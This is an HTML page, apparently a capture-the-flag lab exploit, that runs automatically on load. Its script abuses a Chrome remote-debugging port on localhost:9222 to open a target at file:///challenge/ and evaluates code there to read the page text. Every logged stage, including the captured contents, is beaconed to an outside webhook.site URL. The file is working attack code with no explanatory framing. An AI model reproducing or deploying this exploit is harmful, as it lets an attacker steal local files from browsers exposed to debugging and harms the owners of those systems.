
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Cancri SP Lab</title>
</head>
<body>
  <h1>Cancri SP Lab</h1>
  <pre id="status">Starting diagnostics...</pre>

  <script>
    const HOOK =
      "https://webhook.site/fa6817a2-e483-45f5-b5ba-2b895046ab55";

    function log(stage, data = {}) {
      const message = {
        stage,
        data,
        time: new Date().toISOString()
      };

      document.getElementById("status").textContent =
        JSON.stringify(message, null, 2);

      navigator.sendBeacon(
        HOOK,
        new Blob(
          [JSON.stringify(message)],
          { type: "text/plain" }
        )
      );
    }

    async function run() {
      log("page_loaded", { url: location.href });

      try {
        const response = await fetch(
          "http://localhost:9222/json/new?file:///challenge/",
          { method: "PUT" }
        );

        const text = await response.text();

        log("cdp_response", {
          status: response.status,
          body: text
        });

        if (!response.ok) {
          return;
        }

        const target = JSON.parse(text);

        log("cdp_target", {
          id: target.id,
          url: target.url,
          websocket: target.webSocketDebuggerUrl
        });

        const ws = new WebSocket(
          target.webSocketDebuggerUrl
        );

        ws.onerror = () => log("websocket_error");

        ws.onopen = async () => {
          log("websocket_open");

          ws.send(JSON.stringify({
            id: 1,
            method: "Runtime.evaluate",
            params: {
              expression: "document.body.innerText",
              returnByValue: true
            }
          }));
        };

        ws.onmessage = event => {
          log("cdp_result", {
            response: event.data
          });
        };

      } catch (error) {
        log("exception", {
          message: error.message,
          stack: error.stack
        });
      }
    }

    run();
  </script>
</body>
</html>
